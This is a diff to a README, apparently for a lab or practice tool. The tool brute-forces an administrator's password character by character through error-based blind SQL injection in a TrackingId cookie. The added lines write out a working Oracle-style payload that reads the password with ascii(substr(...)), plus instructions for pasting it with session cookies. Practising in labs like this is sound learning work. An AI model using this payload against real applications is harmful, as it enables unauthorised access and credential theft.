@@ -14,11 +14,14 @@ The tool Brute-force multiple requests trying all the alphanumeric characters ba
 
 2. Write the SQLi query and paste it in the `sqli_payload` paramenter 
 
+```
+ sqli_payload = "' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and ascii(substr(password,%s,1))='%s') || ' " % (i,j)
+```         
+
 3. Paste the value of all the cookies in the `cookies_sqli` paramenter
 
 ```
-  cookies_sqli = {'TrackingId': 'Paste Here' + sqli_payload_encoded, 'session': 'Paste Here'}
-
+cookies_sqli = {'TrackingId': 'Paste Here' + sqli_payload_encoded, 'session': 'Paste Here'}
 ```
 
 ### How to Reproduce 
